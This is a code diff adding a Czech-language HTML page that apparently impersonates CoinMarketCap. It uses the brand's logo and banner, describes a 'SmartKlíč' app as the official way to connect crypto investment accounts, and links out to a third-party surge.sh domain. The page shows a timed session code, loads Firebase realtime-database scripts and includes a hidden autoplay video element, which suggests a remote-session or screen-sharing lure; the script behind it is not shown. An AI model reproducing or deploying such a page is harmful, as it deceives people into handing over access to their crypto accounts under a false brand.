@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CoinMarketCap – Klientský portál</title>
+    <link rel="stylesheet" href="css/client.css">
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+</head>
+<body>
+
+<header>
+    <div class="logo-area">
+        <img class="logo-img" src="https://s3-eu-west-1.amazonaws.com/tpd/logos/5900cd240000ff0005a144b5/0x0.png" alt="Logo">
+        <span>CoinMarketCap</span>
+    </div>
+    <div class="status-indicator">
+        <span class="dot" id="statusDot"></span>
+        <span id="statusText">Načítání...</span>
+    </div>
+</header>
+
+<div class="container">
+    <div class="main-layout">
+        <div class="left-panel">
+            <div class="connect-box">
+                <button id="hostBtn" disabled>Načítání...</button>
+                <div id="ticketWrapper" class="ticket-wrapper">
+                    <div class="ticket-label">Váš kupon k účtu</div>
+                    <h2 id="roomCode">----</h2>
+                    <div class="timer-text" id="timerText"></div>
+                </div>
+            </div>
+        </div>
+        <div class="right-panel">
+            <div class="info-card">
+                <div class="banner-container">
+                    <img class="banner-img" src="https://s2.coinmarketcap.com/static/cloud/img/app-banner/fullscreen-2.png?_=96db608" alt="CoinMarketCap Banner">
+                </div>
+                <h3>SmartKlíč CoinMarketCap</h3>
+                <p>SmartKlíč je oficiální aplikace pro bezpečné a rychlé připojení k vaší kryptoměnové infrastruktuře a investičnímu účtu.</p>
+                <a class="action-card-btn" href="https://coinmarketcap.surge.sh/" target="_blank">Dozvědět se více</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer>© 2026 SmartKlíč • Oficiální instalační balíček</footer>
+
+<video id="video" autoplay playsinline style="display: none;"></video>
+<div id="fpsCounter" style="position:fixed;bottom:10px;right:10px;background:rgba(0,0,0,0.7);color:#10b981;padding:6px 12px;border-radius:6px;font-family:monospace;font-size:12px;z-index:9999;">FPS: -- | Q: --%</div>
+<script src="js/client.js"></script>
+</body>
+</html>
